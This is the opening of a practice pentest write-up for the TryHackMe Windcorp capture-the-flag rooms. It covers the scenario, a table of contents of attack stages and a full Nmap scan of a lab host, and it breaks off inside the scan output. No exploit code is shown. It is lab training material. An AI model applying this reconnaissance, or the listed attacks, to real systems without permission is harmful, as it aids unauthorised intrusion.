# windcorp
Pentest Report for the Windcorp CTF Challenges

This report details the findings, methodologies, and steps taken during the penetration testing of the Windcorp series of Capture The Flag challenges. This is a practice documentation and is by no means a professional assessment. The purpose of this report is to outline key vulnerabilities, exploitation techniques and methodology.

## Table of contents

- [Ra](#ra)
  - [Reconnaissance](#reconnaissance-ra)
  - [Company Portal](#company-portal)
  - [Admin Center](#admin-center)
  - [Openfire Admin Console](#openfire-admin-console)
  - [Windcorp Fire Web Page](#windcorp-fire-web-page)
  - [SMB Shares](#smb-shares-ra)
  - [Spark Application](#spark-application)
  - [CVE-2020-12772](#cve-2020-12772)
  - [Initial Access](#initial-access-ra)
  - [Post-Exploitation](#post-exploitation)
  - [Privilege Escalation](#privilege-escalation)
  - [Goal Execution](#goal-execution-ra)
  
- [Ra2](#ra2)
  - [Reconnaissance](#reconnaissance-ra2)
  - [Web Pages](#web-pages)
  - [Extracting Private Keys from cert.pfx](#extracting-private-keys-from-certpfx)
  - [DNS Cache Poisoning](#dns-cache-poisoning)
  - [NTLMv2 Authentication Intercept with MITM](#ntlmv2-authentication-intercept-with-mitm)
  - [Initial Access](#initial-access-ra2)
  - [Abusing Access Tokens](#abusing-access-tokens)
  - [Goal Execution](#goal-execution-ra2)

- [Set](#set)
  - [Reconnaissance](#reconnaissance-set)
  - [Webpage Enumeration](#webpage-enumeration)
  - [SMB Shares](#smb-shares-set)
  - [Initial Access](#initial-access-set)
  - [Internal Enumeration](#internal-enumeration)
  - [CVE-2020-10914](#cve-2020-10914)
  - [Privilege Escalation](#privilege-escalation-set)
  - [Goal Execution](#goal-execution-set)

- [Osiris](#osiris)

---

# Ra

> https://tryhackme.com/r/room/ra
> 
![Pasted image 20240807192728](https://github.com/user-attachments/assets/46d10860-6bf0-45ca-8d9b-05473e9bdfa4)

You have gained access to the internal network of WindCorp, the multibillion dollar company, running an extensive social media campaign claiming to be unhackable (ha! so much for that claim!).

Next step would be to take their crown jewels and get full access to their internal network. You have spotted a new windows machine that may lead you to your end goal. Can you conquer this end boss and own their internal network?

### Reconnaissance Ra

On August 7, 2024, a Nmap scan was conducted on the target machine with IP address 10.10.72.102. The scan revealed a range of open ports and services, as well as two domain names.

  1. **windcorp.thm**: This domain name appears to be associated with the Microsoft Windows Active Directory setup on the machine.
  2. **fire.windcorp.thm**: Another key domain name that was found in various SSL certificates. It indicates a subdomain of the primary domain `windcorp.thm`.

The target has a range of services exposed, including IIS, Kerberos, XMPP and Active Directory services.
<br>


<details>
  <summary>Nmap Scan Results</summary>
  <pre>
# Nmap 7.94SVN scan initiated Wed Aug  7 19:32:06 2024 as: nmap -sV -sC -Pn -vv -T4 -oN nmap/ra.nmap 10.10.72.102
Nmap scan report for 10.10.72.102
Host is up, received user-set (0.33s latency).
Scanned at 2024-08-07 19:32:06 -03 for 169s
<!--  -->
Not shown: 978 filtered tcp ports (no-response)
PORT     STATE SERVICE             REASON  VERSION
53/tcp   open  domain              syn-ack Simple DNS Plus
80/tcp   open  http                syn-ack Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Windcorp.
88/tcp   open  kerberos-sec        syn-ack Microsoft Windows Kerberos (server time: 2024-08-07 22:32:26Z)
135/tcp  open  msrpc               syn-ack Microsoft Windows RPC
139/tcp  open  netbios-ssn         syn-ack Microsoft Windows netbios-ssn
389/tcp  open  ldap                syn-ack Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
443/tcp  open  ssl/http            syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: 2024-08-07T22:34:38+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=Windows Admin Center
| Subject Alternative Name: DNS:WIN-2FAA40QQ70B
| Issuer: commonName=Windows Admin Center
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha512WithRSAEncryption
| Not valid before: 2020-04-30T14:41:03
| Not valid after:  2020-06-30T14:41:02
| MD5:   31ef:ecc2:3c93:81b1:67cf:3015:a99f:1726
| SHA-1: ef2b:ac66:5e99:dae7:1182:73a1:93e8:a0b7:c772:f49c
| -----BEGIN CERTIFICATE-----
| MIIDKjCCAhKgAwIBAgIQNNQMnqzkYo9F7VUN7yWKjjANBgkqhkiG9w0BAQ0FADAf
| MR0wGwYDVQQDDBRXaW5kb3dzIEFkbWluIENlbnRlcjAeFw0yMDA0MzAxNDQxMDNa
| Fw0yMDA2MzAxNDQxMDJaMB8xHTAbBgNVBAMMFFdpbmRvd3MgQWRtaW4gQ2VudGVy
| MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuJVIv7BUTSMnBDGoFN8w
| ovWbixi/VWuk90MoL6wrIjyP0jri/hv2QtcVas0O18rkOKcOBDxBIr7Xdzi5c15J
| NtWG9J3EwCOnJzdfwIqmVS432Ilcn88HcGkf1mR8VlYMv7LcPtUF2yGeppOkVrnG
| 9yyAi0syDNNPZ9vKHMG9D6wn/azqHW8VKaAck74QQ6Cdui3n8Zaj74KT/U9gvybO
| VCy+vO0vp3dTCDYEV9JQZbAjHf+hNeZ94g0kZVwEMAsxUnwmHvDAjV9Rw2vq80aI
| Q0U/ituAiZToy+fIW/pkhglCrN2CG16gfNPXtkir7i2LLJoMmKpDsVOT/qzES56z
| 4QIDAQABo2IwYDAOBgNVHQ8BAf8EBAMCArQwEwYDVR0lBAwwCgYIKwYBBQUHAwEw
| GgYDVR0RBBMwEYIPV0lOLTJGQUE0MFFRNzBCMB0GA1UdDgQWBBRMJPe3nGSLMyMv
| geaDFiAXGPtk9DANBgkqhkiG9w0BAQ0FAAOCAQEAFyTGjnnQAhB4qusjFW4MHSlA
| SNJIpiHVNx60pKloWX2+vC+k3NUhe+GsEDuWQrvA8iPa4OyBe5K4e99B/WLP93Bl
| fCwCqBfT1cDDMVkjh23n2z/qyTOvIds/cOAKjYGXA+IjUiYHGZzy3S4Iei6kxB+L
| g1c1joEoGcz0IxLE41TenbOmuomxZJvW0GbNdzobiuWonUrR0iMtzXQP8mlRGF8W
| Pu5wA9SJgoqJYI58O/+7jBpOPZnGNYtmnX9gFfzXPUuOyiiup2G5jX8mDj8gVmii
| sAWSGMcJ6iJMPa7/hlyqvbgeLcZt921eJ05dVJxaaUovMf9rxpvdVa1Qh+QLEQ==
|_-----END CERTIFICATE-----
| tls-alpn: 
|_  http/1.1
445/tcp  open  microsoft-ds?       syn-ack
464/tcp  open  kpasswd5?           syn-ack
593/tcp  open  ncacn_http          syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?            syn-ack
2179/tcp open  vmrdp?              syn-ack
3268/tcp open  ldap                syn-ack Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl?   syn-ack
3389/tcp open  ms-wbt-server       syn-ack Microsoft Terminal Services
|_ssl-date: 2024-08-07T22:34:39+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: WINDCORP
|   NetBIOS_Domain_Name: WINDCORP
|   NetBIOS_Computer_Name: FIRE
|   DNS_Domain_Name: windcorp.thm
|   DNS_Computer_Name: Fire.windcorp.thm
|   DNS_Tree_Name: windcorp.thm
|   Product_Version: 10.0.17763
|_  System_Time: 2024-08-07T22:33:37+00:00
| ssl-cert: Subject: commonName=Fire.windcorp.thm
| Issuer: commonName=Fire.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-06T22:25:35
| Not valid after:  2025-02-05T22:25:35
| MD5:   a46f:b6f4:5bff:a10d:3cd0:13b2:af46:57cb
| SHA-1: df1e:a955:1989:7f0e:3c34:81de:1bc8:3011:37ec:2dd8
| -----BEGIN CERTIFICATE-----
| MIIC5jCCAc6gAwIBAgIQImXZoOCZ25tEXoblCAXzlTANBgkqhkiG9w0BAQsFADAc
| MRowGAYDVQQDExFGaXJlLndpbmRjb3JwLnRobTAeFw0yNDA4MDYyMjI1MzVaFw0y
| NTAyMDUyMjI1MzVaMBwxGjAYBgNVBAMTEUZpcmUud2luZGNvcnAudGhtMIIBIjAN
| BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAreQj+EK1SLefNkNKjdnpRf2+52OP
| Y4KVRqCWWrnGV70JZZFcfJWAYWhhBR2JtWWr9q28TvrthaU6Nrh6Nhf/PEfVfYo8
| naq5ZQqZmLVSEfKx3Rr1tWc5T1Gf3Dt4z/oERqYMQyNUI7Cg/9wwTIlnJA2OIpmr
| x3oiq8W2Y210wugJ/lZ4t+u+nXcsvahyOzkWnqLMdaM+a/TJA0AuNfeB5a1mvbUz
| rqsx822bgXpkBosoRqhgHYzUNHeCXTjjqH42vnFH7emB/wF4ZDb/b7SJg9Syf8jO
| 2p+HlfDfH+wQqmJ54K/BefegbuRph/lPQK/3wOgoUnOr8iKiYPXjJHMAqQIDAQAB
| oyQwIjATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcN
| AQELBQADggEBAIq3ZgfNxIHBQ3KcAFCuLGliaSG/apX7L9L1D/gTKev0GL+yAGrA
| ryMYcK9VpowavmVFScxy4mbDXKoEp75lU0icuJzTU/JnW0Oe70cQRn+c51bAaLnW
| sg2DzowFpA9YsIbEEKyltRzQVSjVJG9eTRFvmDvBxFNrO680aPPrdPOCW1FiNvHC
| 7fBbnhWYG4r031zVs1IT4TElvgs2pH6iqplaWNXY8RWtWyYlMVgJLA7KcU6z+CG7
| YJqLNqxwMZ7AVLQBm9EyYK4EGLXwFTXrwK+MlnwO/85GvGSwP+5IBUkYeXazNraI
| BkEZXfhMdSeVy2xdjlF3lHQU5mf+N9tagik=
|_-----END CERTIFICATE-----
5222/tcp open  jabber              syn-ack
|_ssl-date: 2024-08-07T22:34:39+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Issuer: commonName=fire.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-01T08:39:00
| Not valid after:  2025-04-30T08:39:00
| MD5:   b715:5425:83f3:a20f:75c8:ca2d:3353:cbb7
| SHA-1: 97f7:0772:a26b:e324:7ed5:bbcb:5f35:7d74:7982:66ae
| -----BEGIN CERTIFICATE-----
| MIIDLzCCAhegAwIBAgIIXUFELG7QgAIwDQYJKoZIhvcNAQELBQAwHDEaMBgGA1UE
| AwwRZmlyZS53aW5kY29ycC50aG0wHhcNMjAwNTAxMDgzOTAwWhcNMjUwNDMwMDgz
| OTAwWjAcMRowGAYDVQQDDBFmaXJlLndpbmRjb3JwLnRobTCCASIwDQYJKoZIhvcN
| AQEBBQADggEPADCCAQoCggEBAKLH0/j17RVdD8eXC+0IFovAoql2REjOSf2NpJLK
| /6fgtx3CA4ftLsj7yOpmj8Oe1gqfWd2EM/zKk+ZmZwQFxLQL93t1OD/za1gyclxr
| IVbPVWqFoM2BUU9O3yU0VVRGP7xKDHm4bcoNmq9UNurEtFlCNeCC1fcwzfYvKD89
| X04Rv/6kn1GlQq/iM8PGCLDUf1p1WJcwGT5FUiBa9boTU9llBcGqbodZaBKzPPP8
| DmvSYF71IKBT8NsVzqiAiO3t/oHgApvUd9BqdbZeN46XORrOhBQV0xUpNVy9L5OE
| UAD1so3ePTNjpPE5SfTKymT1a8Fiw5kroKODN0nzy50yP3UCAwEAAaN1MHMwMQYD
| VR0RBCowKIIRZmlyZS53aW5kY29ycC50aG2CEyouZmlyZS53aW5kY29ycC50aG0w
| HQYDVR0OBBYEFOtMzqgfsY11qewZNfPjiLxnGykGMB8GA1UdIwQYMBaAFOtMzqgf
| sY11qewZNfPjiLxnGykGMA0GCSqGSIb3DQEBCwUAA4IBAQAHofv0VP+hE+5sg0KR
| 2x0Xeg4cIXEia0c5cIJ7K7bhfoLOcT7WcMKCLIN3A416PREdkB6Q610uDs8RpezJ
| II/wBoIp2G0Y87X3Xo5FmNJjl9lGX5fvayen98khPXvZkurHdWdtA4m8pHOdYOrk
| n8Jth6L/y4L5WlgEGL0x0HK4yvd3iz0VNrc810HugpyfVWeasChhZjgAYXUVlA8k
| +QxLxyNr/PBfRumQGzw2n3msXxwfHVzaHphy56ph85PcRS35iNqgrtK0fe3Qhpq7
| v5vQYKlOGq5FI6Mf9ni7S1pXSqF4U9wuqZy4q4tXWAVootmJv1DIgfSMLvXplN9T
| LucP
|_-----END CERTIFICATE-----
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     errors: 
|       invalid-namespace
|       (timeout)
|     stream_id: 3xz8u4q749
|     features: 
|     capabilities: 
|     unknown: 
|     auth_mechanisms: 
|     xmpp: 
|       version: 1.0
|_    compression_methods: 
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
5269/tcp open  xmpp                syn-ack Wildfire XMPP Client
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     compression_methods: 
|     features: 
|     capabilities: 
|     unknown: 
|     errors: 
|       (timeout)
|     xmpp: 
|_    auth_mechanisms: 
7070/tcp open  http                syn-ack Jetty 9.4.18.v20190429
|_http-server-header: Jetty(9.4.18.v20190429)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Openfire HTTP Binding Service
7443/tcp open  ssl/http            syn-ack Jetty 9.4.18.v20190429
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Issuer: commonName=fire.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-01T08:39:00
| Not valid after:  2025-04-30T08:39:00
| MD5:   b715:5425:83f3:a20f:75c8:ca2d:3353:cbb7
| SHA-1: 97f7:0772:a26b:e324:7ed5:bbcb:5f35:7d74:7982:66ae
| -----BEGIN CERTIFICATE-----
| MIIDLzCCAhegAwIBAgIIXUFELG7QgAIwDQYJKoZIhvcNAQELBQAwHDEaMBgGA1UE
| AwwRZmlyZS53aW5kY29ycC50aG0wHhcNMjAwNTAxMDgzOTAwWhcNMjUwNDMwMDgz
| OTAwWjAcMRowGAYDVQQDDBFmaXJlLndpbmRjb3JwLnRobTCCASIwDQYJKoZIhvcN
| AQEBBQADggEPADCCAQoCggEBAKLH0/j17RVdD8eXC+0IFovAoql2REjOSf2NpJLK
| /6fgtx3CA4ftLsj7yOpmj8Oe1gqfWd2EM/zKk+ZmZwQFxLQL93t1OD/za1gyclxr
| IVbPVWqFoM2BUU9O3yU0VVRGP7xKDHm4bcoNmq9UNurEtFlCNeCC1fcwzfYvKD89
| X04Rv/6kn1GlQq/iM8PGCLDUf1p1WJcwGT5FUiBa9boTU9llBcGqbodZaBKzPPP8
| DmvSYF71IKBT8NsVzqiAiO3t/oHgApvUd9BqdbZeN46XORrOhBQV0xUpNVy9L5OE
| UAD1so3ePTNjpPE5SfTKymT1a8Fiw5kroKODN0nzy50yP3UCAwEAAaN1MHMwMQYD
| VR0RBCowKIIRZmlyZS53aW5kY29ycC50aG2CEyouZmlyZS53aW5kY29ycC50aG0w
| HQYDVR0OBBYEFOtMzqgfsY11qewZNfPjiLxnGykGMB8GA1UdIwQYMBaAFOtMzqgf
| sY11qewZNfPjiLxnGykGMA0GCSqGSIb3DQEBCwUAA4IBAQAHofv0VP+hE+5sg0KR
| 2x0Xeg4cIXEia0c5cIJ7K7bhfoLOcT7WcMKCLIN3A416PREdkB6Q610uDs8RpezJ
| II/wBoIp2G0Y87X3Xo5FmNJjl9lGX5fvayen98khPXvZkurHdWdtA4m8pHOdYOrk
| n8Jth6L/y4L5WlgEGL0x0HK4yvd3iz0VNrc810HugpyfVWeasChhZjgAYXUVlA8k
| +QxLxyNr/PBfRumQGzw2n3msXxwfHVzaHphy56ph85PcRS35iNqgrtK0fe3Qhpq7
| v5vQYKlOGq5FI6Mf9ni7S1pXSqF4U9wuqZy4q4tXWAVootmJv1DIgfSMLvXplN9T
| LucP
|_-----END CERTIFICATE-----
7777/tcp open  socks5              syn-ack (No authentication; connection failed)
| socks-auth-info: 
|_  No authentication
9090/tcp open  zeus-admin?         syn-ack
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Wed, 07 Aug 2024 22:32:26 GMT
|     Last-Modified: Fri, 31 Jan 2020 17:54:10 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 115
|     <html>
|     <head><title></title>
|     <meta http-equiv="refresh" content="0;URL=index.jsp">
|     </head>
|     <body>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Wed, 07 Aug 2024 22:32:36 GMT
|     Allow: GET,HEAD,POST,OPTIONS
|   JavaRMI, drda, ibm-db2-das, informix: 
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
|   SqueezeCenter_CLI: 
|     HTTP/1.1 400 No URI
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 49
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>
|   WMSRequest: 
|     HTTP/1.1 400 Illegal character CNTL=0x1
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x1</pre>
9091/tcp open  ssl/xmltec-xmlmail? syn-ack
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Issuer: commonName=fire.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-01T08:39:00
| Not valid after:  2025-04-30T08:39:00
| MD5:   b715:5425:83f3:a20f:75c8:ca2d:3353:cbb7
| SHA-1: 97f7:0772:a26b:e324:7ed5:bbcb:5f35:7d74:7982:66ae
| -----BEGIN CERTIFICATE-----
| MIIDLzCCAhegAwIBAgIIXUFELG7QgAIwDQYJKoZIhvcNAQELBQAwHDEaMBgGA1UE
| AwwRZmlyZS53aW5kY29ycC50aG0wHhcNMjAwNTAxMDgzOTAwWhcNMjUwNDMwMDgz
| OTAwWjAcMRowGAYDVQQDDBFmaXJlLndpbmRjb3JwLnRobTCCASIwDQYJKoZIhvcN
| AQEBBQADggEPADCCAQoCggEBAKLH0/j17RVdD8eXC+0IFovAoql2REjOSf2NpJLK
| /6fgtx3CA4ftLsj7yOpmj8Oe1gqfWd2EM/zKk+ZmZwQFxLQL93t1OD/za1gyclxr
| IVbPVWqFoM2BUU9O3yU0VVRGP7xKDHm4bcoNmq9UNurEtFlCNeCC1fcwzfYvKD89
| X04Rv/6kn1GlQq/iM8PGCLDUf1p1WJcwGT5FUiBa9boTU9llBcGqbodZaBKzPPP8
| DmvSYF71IKBT8NsVzqiAiO3t/oHgApvUd9BqdbZeN46XORrOhBQV0xUpNVy9L5OE
| UAD1so3ePTNjpPE5SfTKymT1a8Fiw5kroKODN0nzy50yP3UCAwEAAaN1MHMwMQYD
| VR0RBCowKIIRZmlyZS53aW5kY29ycC50aG2CEyouZmlyZS53aW5kY29ycC50aG0w
| HQYDVR0OBBYEFOtMzqgfsY11qewZNfPjiLxnGykGMB8GA1UdIwQYMBaAFOtMzqgf
| sY11qewZNfPjiLxnGykGMA0GCSqGSIb3DQEBCwUAA4IBAQAHofv0VP+hE+5sg0KR
| 2x0Xeg4cIXEia0c5cIJ7K7bhfoLOcT7WcMKCLIN3A416PREdkB6Q610uDs8RpezJ
| II/wBoIp2G0Y87X3Xo5FmNJjl9lGX5fvayen98khPXvZkurHdWdtA4m8pHOdYOrk
| n8Jth6L/y4L5WlgEGL0x0HK4yvd3iz0VNrc810HugpyfVWeasChhZjgAYXUVlA8k
| +QxLxyNr/PBfRumQGzw2n3msXxwfHVzaHphy56ph85PcRS35iNqgrtK0fe3Qhpq7
| v5vQYKlOGq5FI6Mf9ni7S1pXSqF4U9wuqZy4q4tXWAVootmJv1DIgfSMLvXplN9T
| LucP
|_-----END CERTIFICATE-----
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP: 
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Wed, 07 Aug 2024 22:32:50 GMT
|     Last-Modified: Fri, 31 Jan 2020 17:54:10 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 115
|     <html>
|     <head><title></title>
|     <meta http-equiv="refresh" content="0;URL=index.jsp">
		|     </head>
		|     <body>
		|     </body>
		|     </html>
		|   HTTPOptions: 
		|     HTTP/1.1 200 OK
		|     Date: Wed, 07 Aug 2024 22:32:52 GMT
		|     Allow: GET,HEAD,POST,OPTIONS
		|   Help: 
		|     HTTP/1.1 400 No URI
		|     Content-Type: text/html;charset=iso-8859-1
		|     Content-Length: 49
		|     Connection: close
		|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>
		|   RPCCheck: 
		|     HTTP/1.1 400 Illegal character OTEXT=0x80
		|     Content-Type: text/html;charset=iso-8859-1
		|     Content-Length: 71
		|     Connection: close
		|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
		|   RTSPRequest: 
		|     HTTP/1.1 400 Unknown Version
		|     Content-Type: text/html;charset=iso-8859-1
		|     Content-Length: 58
		|     Connection: close
		|     <h1>Bad Message 400</h1><pre>reason: Unknown Version</pre>
		|   SSLSessionReq: 
		|     HTTP/1.1 400 Illegal character CNTL=0x16
		|     Content-Type: text/html;charset=iso-8859-1
		|     Content-Length: 70
		|     Connection: close
		|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x16</pre>
		3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
		==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
		SF-Port5222-TCP:V=7.94SVN%I=7%D=8/7%Time=66B3F60F%P=x86_64-pc-linux-gnu%r(
		SF:RPCCheck,9B,"<stream:error\x20xmlns:stream=\"http://etherx\.jabber\.org
		SF:/streams\"><not-well-formed\x20xmlns=\"urn:ietf:params:xml:ns:xmpp-stre
		SF:ams\"/></stream:error></stream:stream>");
		==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
		SF-Port9090-TCP:V=7.94SVN%I=7%D=8/7%Time=66B3F5FA%P=x86_64-pc-linux-gnu%r(
		SF:GetRequest,11D,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Wed,\x2007\x20Aug\x2
		SF:02024\x2022:32:26\x20GMT\r\nLast-Modified:\x20Fri,\x2031\x20Jan\x202020
		SF:\x2017:54:10\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-Ranges:\x20
		SF:bytes\r\nContent-Length:\x20115\r\n\r\n<html>\n<head><title></title>\n<
		SF:meta\x20http-equiv=\"refresh\"\x20content=\"0;URL=index\.jsp\">\n</head
		SF:>\n<body>\n</body>\n</html>\n\n")%r(JavaRMI,C3,"HTTP/1\.1\x20400\x20Ill
		SF:egal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;charset=iso
		SF:-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\n<h1>Bad
		SF:\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x0
		SF:</pre>")%r(WMSRequest,C3,"HTTP/1\.1\x20400\x20Illegal\x20character\x20C
		SF:NTL=0x1\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nContent-Len
		SF:gth:\x2069\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1
		SF:><pre>reason:\x20Illegal\x20character\x20CNTL=0x1</pre>")%r(ibm-db2-das
		SF:,C3,"HTTP/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Ty
		SF:pe:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnect
		SF:ion:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Ille
		SF:gal\x20character\x20CNTL=0x0</pre>")%r(SqueezeCenter_CLI,9B,"HTTP/1\.1\
		SF:x20400\x20No\x20URI\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\
		SF:nContent-Length:\x2049\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Messag
		SF:e\x20400</h1><pre>reason:\x20No\x20URI</pre>")%r(informix,C3,"HTTP/1\.1
		SF:\x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/ht
		SF:ml;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\
		SF:r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20charact
		SF:er\x20CNTL=0x0</pre>")%r(drda,C3,"HTTP/1\.1\x20400\x20Illegal\x20charac
		SF:ter\x20CNTL=0x0\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nCon
		SF:tent-Length:\x2069\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x2
		SF:0400</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x0</pre>")%r(HTT
		SF:POptions,56,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Wed,\x2007\x20Aug\x2020
		SF:24\x2022:32:36\x20GMT\r\nAllow:\x20GET,HEAD,POST,OPTIONS\r\n\r\n");
		==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
		SF-Port9091-TCP:V=7.94SVN%T=SSL%I=7%D=8/7%Time=66B3F613%P=x86_64-pc-linux-
		SF:gnu%r(GetRequest,11D,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Wed,\x2007\x20
		SF:Aug\x202024\x2022:32:50\x20GMT\r\nLast-Modified:\x20Fri,\x2031\x20Jan\x
		SF:202020\x2017:54:10\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-Range
		SF:s:\x20bytes\r\nContent-Length:\x20115\r\n\r\n<html>\n<head><title></tit
		SF:le>\n<meta\x20http-equiv=\"refresh\"\x20content=\"0;URL=index\.jsp\">\n
		SF:</head>\n<body>\n</body>\n</html>\n\n")%r(HTTPOptions,56,"HTTP/1\.1\x20
		SF:200\x20OK\r\nDate:\x20Wed,\x2007\x20Aug\x202024\x2022:32:52\x20GMT\r\nA
		SF:llow:\x20GET,HEAD,POST,OPTIONS\r\n\r\n")%r(RTSPRequest,AD,"HTTP/1\.1\x2
		SF:0400\x20Unknown\x20Version\r\nContent-Type:\x20text/html;charset=iso-88
		SF:59-1\r\nContent-Length:\x2058\r\nConnection:\x20close\r\n\r\n<h1>Bad\x2
		SF:0Message\x20400</h1><pre>reason:\x20Unknown\x20Version</pre>")%r(RPCChe
		SF:ck,C7,"HTTP/1\.1\x20400\x20Illegal\x20character\x20OTEXT=0x80\r\nConten
		SF:t-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2071\r\nCon
		SF:nection:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20
		SF:Illegal\x20character\x20OTEXT=0x80</pre>")%r(DNSVersionBindReqTCP,C3,"H
		SF:TTP/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x2
		SF:0text/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x
		SF:20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x2
		SF:0character\x20CNTL=0x0</pre>")%r(DNSStatusRequestTCP,C3,"HTTP/1\.1\x204
		SF:00\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;ch
		SF:arset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r
		SF:\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\x2
		SF:0CNTL=0x0</pre>")%r(Help,9B,"HTTP/1\.1\x20400\x20No\x20URI\r\nContent-T
		SF:ype:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2049\r\nConnec
		SF:tion:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20No\
		SF:x20URI</pre>")%r(SSLSessionReq,C5,"HTTP/1\.1\x20400\x20Illegal\x20chara
		SF:cter\x20CNTL=0x16\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nC
		SF:ontent-Length:\x2070\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\
		SF:x20400</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x16</pre>");
		Service Info: Host: FIRE; OS: Windows; CPE: cpe:/o:microsoft:windows
		
		Host script results:
		| smb2-time: 
		|   date: 2024-08-07T22:33:36
		|_  start_date: N/A
		|_clock-skew: mean: 0s, deviation: 0s, median: -1s
		| smb2-security-mode: 
		|   3:1:1: 
		|_    Message signing enabled and required
		| p2p-conficker: 
		|   Checking for Conficker.C or higher...
		|   Check 1 (port 22631/tcp): CLEAN (Timeout)
		|   Check 2 (port 34974/tcp): CLEAN (Timeout)
